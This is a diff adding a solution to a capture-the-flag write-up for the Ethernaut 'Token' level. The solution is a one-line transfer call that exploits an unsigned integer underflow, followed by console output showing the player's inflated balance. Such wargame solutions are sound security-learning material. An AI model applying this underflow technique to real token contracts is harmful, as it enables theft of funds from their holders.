@@ -1,6 +1,6 @@
 ---
 title: "Token"
-tags: [""]
+tags: ["Overflow"]
 reference: https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407
 ---
 
@@ -41,4 +41,57 @@ contract Token {
 
 # Solution
 
-TODO
+1. unsigned integer overflow attack
+
+```
+contract.transfer(instance, 30)
+```
+
+2. check balance of player
+
+```
+await contract.balanceOf(player)
+i {negative: 0, words: Array(11), length: 10, red: null}
+length
+: 
+10
+negative
+: 
+0
+red
+: 
+null
+words
+: 
+Array(11)
+0
+: 
+67108833
+1
+: 
+67108863
+2
+: 
+67108863
+3
+: 
+67108863
+4
+: 
+67108863
+5
+: 
+67108863
+6
+: 
+67108863
+7
+: 
+67108863
+8
+: 
+67108863
+9
+: 
+4194303
+```
